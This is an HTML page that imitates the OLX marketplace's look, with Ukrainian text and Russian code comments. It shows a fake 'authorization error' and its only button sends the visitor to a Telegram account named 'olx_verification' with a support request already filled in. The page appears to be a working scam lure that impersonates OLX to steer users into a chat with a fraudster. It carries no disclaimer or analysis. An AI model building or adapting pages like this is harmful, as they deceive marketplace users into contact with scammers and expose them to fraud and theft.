<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Авторизація OLX</title>
<style>
/* --- Общий фон --- */
body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

/* --- Карточка OLX --- */
.card {
    background: #ffffff;
    padding: 40px 30px;
    border-radius: 12px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
    text-align: center;
    width: 360px;
}

/* --- Заголовок --- */
.card h2 {
    color: #002f5f; /* OLX синій */
    margin-bottom: 15px;
    font-size: 22px;
}

/* --- Текст --- */
.card p {
    color: #333;
    margin-bottom: 25px;
    font-size: 16px;
}

/* --- Кнопка --- */
button {
    padding: 14px 25px;
    background: #ff6600; /* OLX помаранчевий */
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
    font-size: 14px;
    transition: background 0.3s;
}

button:hover {
    background: #e65c00;
}
</style>
</head>
<body>

<div class="card">
    <h2>Помилка авторизації</h2>
    <p id="status">Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації».</p>
    <button id="btn">Зв'язатися через Telegram</button>
</div>

<script>
// Ссылка на Telegram, с предзаполненным текстом
const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
    "Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації»"
);

// При клике на кнопку — перенаправление в Telegram
document.getElementById("btn").addEventListener("click", () => {
    window.location.href = telegramUrl;
});
</script>

</body>
</html>
